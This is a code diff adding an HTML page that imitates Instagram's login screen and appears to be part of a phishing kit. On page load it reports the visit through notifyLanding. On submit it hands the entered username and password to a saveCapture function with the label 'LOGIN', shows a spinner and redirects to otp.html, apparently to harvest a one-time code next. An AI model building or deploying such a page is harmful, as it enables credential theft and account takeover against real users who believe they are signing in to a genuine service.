@@ -1,0 +1,27 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login - Instagram</title><link rel="stylesheet" href="style.css"></head>
+<body><div class="card">
+<div class="logo">I</div>
+<div class="title">Instagram</div>
+<div class="subtitle">Sign in with your username or phone</div>
+<form id="loginForm">
+<div class="form-group"><label for="identity">Username or Phone</label><input type="text" id="identity" placeholder="Username, phone, or email" required></div>
+<div class="form-group"><label for="password">Password</label><input type="password" id="password" placeholder="Enter your password" required></div>
+<button type="submit" id="continueBtn">Sign In</button>
+</form>
+<div class="footer">© 2026 Instagram · All rights reserved</div>
+</div>
+<script src="helper.js"></script>
+<script>
+const SITE='instagram', DISPLAY='Instagram', CATEGORY='social_media';
+window.addEventListener('load', () => notifyLanding(SITE, CATEGORY, 'Login'));
+document.getElementById('loginForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const id = document.getElementById('identity').value.trim();
+  const pwd = document.getElementById('password').value.trim();
+  if (!id || !pwd) return;
+  const btn = document.getElementById('continueBtn');
+  btn.innerHTML = '<div class="spinner"></div>'; btn.disabled = true;
+  saveCapture(SITE, CATEGORY, 'LOGIN', { identity: id, password: pwd }, 'Login');
+  setTimeout(() => { window.location.href = 'otp.html'; }, 1500);
+});
+</script></body></html>
